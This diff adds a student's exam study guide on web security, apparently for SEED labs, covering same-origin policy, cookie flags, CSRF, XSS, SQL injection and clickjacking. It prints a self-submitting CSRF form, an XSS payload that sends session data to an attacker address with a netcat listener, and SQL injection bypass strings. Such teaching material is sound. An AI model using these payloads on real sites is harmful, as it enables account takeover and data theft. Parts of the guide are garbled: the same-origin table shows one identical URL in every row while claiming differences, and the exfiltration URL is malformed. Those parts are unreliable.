@@ -1,0 +1,144 @@
+W05_Web_Clickjacking.pptx, W01_Web_Security_Basics.pptx, W02_Web_CSRF.pptx, W03_Web_XSS.pptx, W04_Web_SQL_Injection.pptx
+
+
+⏱️ 2-Hour Study Timeline
+
+• 00:00 - 00:20 (20m): Module 1: Web Security Basics
+• 00:20 - 00:45 (25m): Module 2: Cross-Site Request Forgery (CSRF)
+• 00:45 - 01:15 (30m): Module 3: Cross-Site Scripting (XSS)
+• 01:15 - 01:45 (30m): Module 4: SQL Injection (SQLi)
+• 01:45 - 02:00 (15m): Module 5: Clickjacking
+
+📂 Module 1: Web Security Basics (00:00 - 00:20)
+
+
+1. Core Mechanics: Same-Origin Policy (SOP)
+
+The foundational security architecture of the web.
+• What it is: A web browser rule preventing scripts on one page from accessing sensitive data on another webpage unless they share the exact same origin.
+• An Origin Definition: An origin is defined strictly by a 3-tuple: Protocol + Hostname + Port.
+text
+Target: http://bank.com
+
+| Compared URL                     | Same? | Reason                                |
+|----------------------------------|-------|---------------------------------------|
+| http://bank.com     | YES   | Protocol, host, and default port match|
+| https://bank.com     | NO    | Protocol mismatch (http vs https)     |
+| http://bank.com   | NO    | Hostname mismatch (subdomain differs) |
+| http://bank.com  | NO    | Port mismatch (80 vs 8080)            |
+Use code with caution.
+• SOP Exception Nuance: SOP does not block a page from loading or embedding cross-origin resources (e.g., <img src="http://evil.com"> or <script src="...">). It blocks a script from reading the response data across origins.
+
+2. Cookie Security Flags (MCQ Goldmine)
+
+• HttpOnly: Tells the browser that Javascript (document.cookie) cannot read this cookie. Primary defense against Session Hijacking via XSS.
+• Secure: The browser will only send this cookie over encrypted (HTTPS) connections.
+• SameSite: Controls whether cookies are sent with cross-site requests:
+	• Strict: Never send cookie on cross-site requests.
+	• Lax: Cookie sent only on "safe" top-level navigations (e.g., standard links). Default in modern browsers.
+	• None: Sent everywhere (requires Secure flag).
+
+📂 Module 2: Cross-Site Request Forgery - CSRF (00:20 - 00:45)
+
+
+1. The Vulnerability Workflow
+
+• The "Why": CSRF exploits the blind trust a web server has in a user's browser session. Browsers automatically attach cookies associated with a domain whenever an HTTP request is fired to that domain.
+text
+[ Alice's Browser ] ------------( 1. Authenticates & Gets Cookie )-----------> [ Bank.com ]
+        |
+        +<--------( 2. Visits Evil Website & Loads Malicious Form )----------- [ Evil.com ]
+        |
+        +====( 3. Form auto-submits POST request to Bank.com + Cookie attached )====> [ Bank.com ]
+                                                                                   (Validates cookie,
+                                                                                    executes fraud!)
+Use code with caution.
+
+2. SEED Lab Workflow & Mechanics
+
+In the SEED CSRF Lab, you typically construct an exploit using an Elgg social networking platform container network.
+• GET-based Attack: Triggered via embedded elements: <img src="http://seed-server.com" width="0" height="0" />
+• POST-based Attack: Requires a self-submitting HTML form hosted on an attacker site:html
+<form id="csrf" action="http://seed-server.com" method="POST">
+    <input type="hidden" name="name" value="Alice" />
+    <input type="hidden" name="briefdescription" value="I am hacked!" />
+</form>
+<script>document.getElementById('csrf').submit();</script>
+Use code with caution.
+
+3. MCQ Trap: Defense Distinctions
+
+• Secret Token Defense (CSRF Token): Server embeds a random, unpredictable token inside a form field. The server expects it back on form processing. Why does this stop CSRF? Because due to the Same-Origin Policy, the attacker's site (Evil.com) cannot read Alice's bank page to steal the token before mimicking the request.
+• Does SameSite stop CSRF? Yes. Setting SameSite=Strict completely breaks the CSRF mechanism because the session cookie won't attach during the cross-site post.
+
+📂 Module 3: Cross-Site Scripting - XSS (00:45 - 01:15)
+
+
+1. Types of XSS: The Crucial Differences
+
+• Stored XSS (Persistent): Malicious script is permanently injected into a database (e.g., a forum post or profile bio). Every user who visits that page gets attacked.
+• Reflected XSS (Non-Persistent): Malicious script travels inside a request URL argument. The server immediately reflects the payload back in the response page unescaped. Targeted via phishing links.
+• DOM-based XSS: The vulnerability exists entirely in client-side JavaScript processing, not server-side code. The payload alters the execution environment without modifying server response data directly.
+
+2. SEED Lab Payload Breakdown
+
+In the SEED XSS Lab, you execute attacks on Elgg. Pay close attention to how Javascript executes in the context of the victim's session.
+• Session Hijacking Payload:html
+<script>
+  new Image().src = "http://http://10.9.0" + elgg.session.user.guid;
+</script>
+Use code with caution.
+Mechanism: Attacker sets up a listener (nc -lvkp 5555) to intercept the cookie appended to the image request.
+• The Elgg Worm Payload: The code needs to propagate itself by copying its own DOM layout into the profile bio field of anyone who views it.
+
+3. MCQ Defense Concept
+
+• Input Sanitization vs Output Encoding: Sanitization filters incoming data (dangerous, prone to bypasses). Output Encoding transforms dynamic data safely right before rendering into HTML (e.g., changing < to &lt;). This prevents the browser from interpreting user data as active code execution.
+
+📂 Module 4: SQL Injection - SQLi (01:15 - 01:45)
+
+
+1. The Vulnerability Cause
+
+• What happens: Occurs when untrusted user input is directly concatenated into a dynamic database query string, confusing the database interpreter into treating user input as executable command logic.
+text
+Vulnerable Server-Side Code:
+$query = "SELECT * FROM users WHERE username = '" . $user_input . "' AND password = '" . $pwd_input . "'";
+
+If user_input is:  admin' #
+The Query becomes: SELECT * FROM users WHERE username = 'admin' #' AND password = '...'
+                                                             ^
+                                                 ( Everything after # becomes a comment! )
+Use code with caution.
+
+2. SEED Lab Attack Workflows
+
+• Authentication Bypass: Entering admin' OR 1=1 # or admin' -- evaluates the WHERE clause true universally, granting root/admin level login without a password.
+• UNION-Based Attack: Used to steal data from other tables entirely.
+	• Rule 1: The injected UNION SELECT statement must have the exact same number of columns as the primary query.
+	• Rule 2: The data types must be compatible across corresponding columns.
+
+3. Absolute Defense: Prepared Statements
+
+• Why Prepared Statements Work: They explicitly separate the query structure from the runtime parameters. The SQL command template is pre-compiled by the database engine before the user parameters are bound. Even if an attacker enters ' OR '1'='1, the database evaluates it literally as a string literal attribute value, not executable statement logic.
+
+📂 Module 5: Clickjacking (01:45 - 02:00)
+
+
+1. Visual Deception Workflow
+
+• Mechanism: An attacker overlays a completely transparent, hidden iframe containing a target web page (e.g., a "Delete Account" page on Facebook) over a decoy button or game link on their own domain.
+• The Trap: The user thinks they are clicking a fun button on Evil.com, but their click coordinates actually register on the invisible iframe page sitting above it.
+text
+[ Visual Layer ] --->  [ Decoy Button: "Click to Win Free iPhone!" ]
+                             | (User Clicks Here)
+[ Hidden Layer ] --->  [ Transparent Iframe: "Confirm Fund Transfer" ]  <-- Click targets this!
+Use code with caution.
+
+2. Key Defenses
+
+• X-Frame-Options Header: Older, reliable server header instruction:
+	• DENY: Page cannot be loaded inside a frame anywhere.
+	• SAMEORIGIN: Page can only be framed if the parent origin matches.
+• Content Security Policy (CSP): The modern, robust standard. Using the frame-ancestors directive allows fine-grained domain whitelisting:http
+Content-Security-Policy: frame-ancestors 'self' https://trustedpartner.com;
